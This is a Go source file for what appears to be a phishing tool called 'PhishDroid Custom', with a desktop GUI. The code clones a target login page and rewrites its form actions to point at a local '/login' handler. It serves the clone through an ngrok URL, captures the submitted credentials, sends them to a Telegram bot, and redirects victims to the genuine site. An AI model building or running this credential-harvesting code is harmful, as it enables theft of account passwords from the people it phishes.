package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"runtime"
	"strings"

	"fyne.io/fyne"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/theme"
	"fyne.io/fyne/widget"

	"github.com/PuerkitoBio/goquery"

	"github.com/raifpy/Go/errHandler"
)

var notiApp fyne.App

func httpForCustumHTML(url string) (*http.Response, error) {
	request, err := http.NewRequest("GET", url, nil)
	if errHandler.HandlerBool(err) {
		return nil, err
	}
	request.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36")
	client := http.Client{}
	return client.Do(request)
}

func customHTMLwithHTTP(reader io.Reader, url, serverLink string) map[string]interface{} {

	httpMap := map[string]interface{}{}

	var scripts int
	var inputValues []string

	doc, err := goquery.NewDocumentFromReader(reader)

	doc.Find("script").Each(func(index int, script *goquery.Selection) {
		log.Println("<script> : ", index)
		scripts++
	})

	doc.Find("input").Each(func(index int, s *goquery.Selection) {
		if name, ok := s.Attr("name"); ok {
			log.Println(index, name)
			inputValues = append(inputValues, name)
		}
	})

	doc.Find("form").Each(func(index int, f *goquery.Selection) {
		f.SetAttr("action", serverLink+"/login")
	})
	html, err := doc.Html()
	if errHandler.HandlerBool(err) {
		httpMap["error"] = err
		return httpMap
	}

	httpMap["scripts"] = scripts
	httpMap["values"] = inputValues
	if url != "" {
		httpMap["html"] = fmt.Sprintf(`<base href="%s">`, url) + "\n" + html
	} else {
		httpMap["html"] = html
	}

	return httpMap

}

func customHTMLServer(kapat chan bool, win fyne.Window, textGrid *widget.TextGrid, html, redirectURL string, textStream *string) {
	serve := func(response http.ResponseWriter, request *http.Request) {
		response.Header().Set("Content-Type", "text/html; charset=UTF-8")
		*textStream += "New Request\n"
		textGrid.SetText(*textStream)
		fmt.Fprintln(response, html)
		return
	}
	serveLogin := func(response http.ResponseWriter, request *http.Request) {
		response.Header().Set("Content-Type", "text/html; charset=UTF-8")
		request.ParseForm()
		valueStr := request.Form.Encode()
		for _, eleman := range strings.Split(valueStr, "&") {
			*textStream += strings.Replace(eleman, "=", "  :  ", -1) + "\n"
			if useTelegramBot {
				tg.send(eleman)
			}
		}
		textGrid.SetText(*textStream)

		notiApp.SendNotification(fyne.NewNotification("New Form", valueStr))
		http.Redirect(response, request, redirectURL, 301)
	}

	/*
		http.HandleFunc("/", serve)
		http.HandleFunc("/login", serveLogin)

		err := http.ListenAndServe(":8089", nil)
		if err != nil {
			dialog.ShowError(err, win)

		}
	*/

	m := http.NewServeMux()
	s := http.Server{Addr: ":8089", Handler: m}
	m.HandleFunc("/", serve)
	m.HandleFunc("/login", serveLogin)

	go func() {
		<-kapat
		s.Shutdown(context.Background())
		fmt.Println("Server Shutdown")

	}()

	if err := s.ListenAndServe(); errHandler.HandlerBool(err) {
		if useTelegramBot {
			tg.send(err.Error())
		}
		dialog.ShowError(err, win)
	}

}

func makeCustomWindow(win fyne.Window, uyg fyne.App, html, serverURL, redirectURL string) {

	var stopBool = false
	stopChan := make(chan bool)
	var str string

	back := widget.NewButtonWithIcon("Back", theme.NavigateBackIcon(), func() {
		gui(uyg, win)
	})

	ngrokText := widget.NewTextGridFromString(serverURL)
	panel := widget.NewTextGrid()
	var runStopButton *widget.Button
	runStopButton = widget.NewButtonWithIcon("Run", theme.MediaPlayIcon(), func() {
		if stopBool {
			stopChan <- true
			stopBool = false
			back.Enable()

			runStopButton.SetText("Run")
			runStopButton.SetIcon(theme.MediaPlayIcon())

			runtime.GC()
			return
		}

		//go fonksiyon(stopChan, win, textGrid, &textStream)
		/*ngrokurl, err := getNgrokLinkStable()
		if err != nil {
			dialog.ShowError(err, win)
			return
		}*/

		ngrokurl := serverURL
		ngrokText.SetText(ngrokurl)

		urlNgrok, err := url.Parse(ngrokurl)
		if err != nil {
			dialog.ShowError(err, win)
		}

		go customHTMLServer(stopChan, win, panel, html, redirectURL, &str)
		go uyg.OpenURL(urlNgrok)
		stopBool = true
		runStopButton.SetText("Stop")
		runStopButton.SetIcon(theme.MediaPauseIcon())
		back.Disable()
		runtime.GC()

	})

	group := widget.NewGroupWithScroller("PhishDroid Custom", ngrokText, cizgi, runStopButton, back, space, panel)
	win.SetContent(group)

}

// Farkındayım çorba oldu...
